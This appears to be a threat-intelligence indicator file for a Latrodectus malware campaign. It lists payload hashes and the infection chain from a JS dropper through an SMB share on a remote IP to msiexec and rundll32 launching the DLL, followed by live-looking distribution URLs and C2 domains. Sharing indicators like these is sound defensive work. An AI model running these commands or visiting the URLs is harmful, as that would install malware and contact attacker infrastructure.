@@ -1,0 +1,62 @@
+11.03.2024 | Latrodectus | Version 1.1 | CampaignID: Littlehw 
+
+*************************************************
+
+url https://qyjifia.org/qbIJGho
+.js e8e76b851fc78d87fe58ad7d29bc6356a8965236d1b96c5f572334dd695d5de9
+.msi ee1e5b80a1d3d47c7703ea2b6b64ee96283ab3628ee4fa1fef6d35d1d9051e9f
+.dll 3b63ea8b6f9b2aa847faa11f6cd3eb281abd9b9cceedb570713c4d78a47de567
+
+*************************************************
+
+url > .js > smb > .msi > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Doc_i93_65b929565-14q83944h2246-4336m9.js
+
+net use A: \\45.95.11.134@80\share\ /persistent:no
+
+msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\qual.msi
+
+msiexec.exe /V
+
+MsiExec.exe -Embedding 2C9A0DF982803D585C8697488A0471F4 C
+
+srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+
+MsiExec.exe -Embedding 69CCA849C3144DAFA2A470C5A1B703A8
+
+MSI8C35.tmp C:\Windows\System32\rundll32.exe C:\Users\Admin\AppData\Local\stat\falcon.dll, vgml
+
+vssvc.exe
+
+rundll32.exe C:\Users\Admin\AppData\Local\stat\falcon.dll, vgml
+
+rundll32.exe C:\Users\Admin\AppData\Roaming\Custom_update\Update_20a070ba.dll", vgml 
+
+rundll32.exe C:\Windows\SYSTEM32\EDGEHTML.dll",#141 Microsoft.VCLibs.140.00_8wekyb3d8bbwe
+
+svchost.exe -k UnistackSvcGroup
+
+
+*************************************************
+
+.dll distro
+
+https://durete.org/
+https://firebasestorage.googleapis.com/v0/b/maga-414515.appspot.com/o/l4djx6IV5c%2FDoc_h37_93i800248-18015745p1346-4493y8.js?alt=media&token=3fe04c8b-ab40-44ea-abbd-f0e3a0f34bfb
+
+
+*************************************************
+
+c2's
+
+https://popfealt.one/live/
+https://ginzbargatey.tech/live/
+https://minndarespo.icu/live/
+https://scifimond.com/live/
+https://drifajizo.fun/live/
+https://popfealt.one/live/
+https://ginzbargatey.tech/live/
+https://minndarespo.icu/live/
+
+*************************************************
